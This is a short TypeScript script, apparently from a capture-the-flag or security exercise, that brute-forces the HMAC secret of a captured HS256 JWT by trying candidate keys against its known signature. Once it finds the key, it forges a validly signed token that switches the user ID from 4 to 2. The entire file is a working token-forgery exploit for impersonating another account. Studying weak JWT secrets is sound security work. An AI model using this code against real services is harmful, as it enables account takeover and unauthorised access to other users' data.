import crypto from "crypto";

const header = {
  alg: "HS256",
  typ: "JWT",
};
const headerB64Url = Buffer.from(JSON.stringify(header)).toString("base64url");

const payload = {
  exp: 1715705567,
  userId: 4,
  iat: 1715698367,
};
const payloadB64Url = Buffer.from(JSON.stringify(payload)).toString(
  "base64url"
);

console.log(`Token starts with: ${headerB64Url}.${payloadB64Url}`);

// you should generate this! Good luck!
const potentialSecretKeys = ["a", "b", "c", "...", "sst!"];

let secretKey: string | undefined = undefined;

for (const potentialSecretKey of potentialSecretKeys) {
  console.log(`Testing ${potentialSecretKey}`);
  const hash = crypto
    .createHmac("sha256", potentialSecretKey)
    .update(`${headerB64Url}.${payloadB64Url}`)
    .digest("base64url");

  if (hash === "7t6J53lEhRcIUOgFxvR_kXZzd_eYdqeXna3dN0fD908") {
    console.log(`Bingo, secret key is ${potentialSecretKey}`);
    secretKey = potentialSecretKey;
    break;
  }
}

if (secretKey !== undefined) {
  const header = {
    alg: "HS256",
    typ: "JWT",
  };
  const headerB64Url = Buffer.from(JSON.stringify(header)).toString(
    "base64url"
  );

  const payload = {
    exp: 1715705567,
    userId: 2,
    iat: 1715698367,
  };
  const payloadB64Url = Buffer.from(JSON.stringify(payload)).toString(
    "base64url"
  );

  const hash = crypto
    .createHmac("sha256", secretKey)
    .update(`${headerB64Url}.${payloadB64Url}`)
    .digest("base64url");

  console.log(`Token is : ${headerB64Url}.${payloadB64Url}.${hash}`);
}
